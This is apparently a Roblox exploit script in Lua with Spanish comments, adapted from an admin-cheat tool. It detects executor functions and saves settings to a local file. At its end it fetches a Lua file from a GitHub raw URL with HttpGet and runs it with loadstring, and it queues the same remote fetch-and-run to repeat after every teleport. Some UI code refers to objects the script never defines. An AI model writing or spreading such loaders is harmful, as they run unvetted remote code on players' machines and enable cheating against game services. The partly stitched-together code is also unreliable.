local cloneref = cloneref or function(o) return o end
Players = cloneref(game:GetService("Players"))
HttpService = cloneref(game:GetService("HttpService"))

-- Definición de UI y otros elementos
Holder = Instance.new("Frame")
Title = Instance.new("TextLabel")
Plugins = Instance.new("TextLabel")
PluginsFrame = Instance.new("Frame")
SaveChatlogs = Instance.new("TextButton")
join = Instance.new("Frame")
selectJoin = Instance.new("TextButton")

Plugins = Instance.new("TextButton")
Plugins.Position = UDim2.new(0, 5, 0, 175)
Plugins.Size = UDim2.new(1, -10, 0, 25)
Plugins.Name = "Plugins"
Plugins.Parent = SettingsHolder

join.Name = "join"
join.Parent = background
join.Active = true
join.BackgroundColor3 = Color3.new(0.141176, 0.141176, 0.145098)
join.BorderSizePixel = 0
join.ClipsDescendants = true
join.Size = UDim2.new(0, 338, 0, 245)
join.Visible = false
join.ZIndex = 10

-- Variables para los servicios de Roblox
IYMouse = Players.LocalPlayer:GetMouse()
PlayerGui = Players.LocalPlayer:FindFirstChildWhichIsA("PlayerGui")
UserInputService = cloneref(game:GetService("UserInputService"))
TweenService = cloneref(game:GetService("TweenService"))
MarketplaceService = cloneref(game:GetService("MarketplaceService"))
RunService = cloneref(game:GetService("RunService"))
TeleportService = cloneref(game:GetService("TeleportService"))
queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
PlaceId, JobId = game.PlaceId, game.JobId

-- Funciones para manejar la escritura y lectura de archivos
local writefile = type(writefile) == "function" and function(file, data, safe)
    if safe == true then return pcall(writefile, file, data) end
    writefile(file, data)
end

local readfile = type(readfile) == "function" and function(file, safe)
    if safe == true then return pcall(readfile, file) end
    return readfile(file)
end

function writefileExploit()
    return writefile ~= nil
end

function readfileExploit()
    return readfile ~= nil
end

function isNumber(str)
    return tonumber(str) ~= nil or str == 'inf'
end

AllWaypoints = {}

-- Editor de eventos (para guardar y cargar configuraciones)
eventEditor = (function()
    local events = {}

    local function registerEvent(name, sets)
        events[name] = {
            commands = {},
            sets = sets or {}
        }
    end

    local function saveData()
        local result = {}
        for i, v in pairs(events) do
            result[i] = v.commands
        end
        return HttpService:JSONEncode(result)
    end

    local function loadData(str)
        local data = HttpService:JSONDecode(str)
        for i, v in pairs(data) do
            if events[i] then
                events[i].commands = v
            end
        end
    end

    return {
        SaveData = saveData,
        LoadData = loadData,
    }
end)()

-- Guardar y cargar configuraciones
local jsonAttempts = 0
function saves()
    if writefileExploit() and readfileExploit() and jsonAttempts < 10 then
        local readSuccess, out = readfile("IY_FE.iy", true)
        if readSuccess and out and out:match("%S") then
            local success, json = pcall(HttpService.JSONDecode, HttpService, out)
            if success then
                prefix = json.prefix or prefix
                StayOpen = json.StayOpen or StayOpen
                KeepInfYield = json.keepIY or KeepInfYield
                loadedEventData = json.eventBinds or loadedEventData
            else
                jsonAttempts = jsonAttempts + 1
                warn("Save Json Error:", json)
                writefile("IY_FE.iy", defaults, true)
                wait()
                saves()
            end
        else
            writefile("IY_FE.iy", defaults, true)
            nosaves = true
            useFactorySettings()
        end
    else
        nosaves = true
        useFactorySettings()
    end
end

saves()

-- Manejo de teleportaciones y ejecución de scripts
local TeleportCheck = false

local function executeScript()
    if not TeleportCheck then
        TeleportCheck = true
        loadstring(game:HttpGet("https://raw.githubusercontent.com/fernando6663535/Scritp_Gratis_Youtubr/main/Prueba.lua"))()
        TeleportCheck = false
    end
end

-- Ejecutar en el servidor actual
executeScript()

-- Preparar para ejecutar en nuevos servidores
if queueteleport then
    queueteleport([[
        task.wait(4.3)
        loadstring(game:HttpGet('https://raw.githubusercontent.com/fernando6663535/Scritp_Gratis_Youtubr/main/Prueba.lua'))()
    ]])
end

Players.LocalPlayer.OnTeleport:Connect(function(State)
    if not TeleportCheck and queueteleport then
        queueteleport([[
            task.wait(4.3)
            loadstring(game:HttpGet('https://raw.githubusercontent.com/fernando6663535/Scritp_Gratis_Youtubr/main/Prueba.lua'))()
        ]])
    end
end)
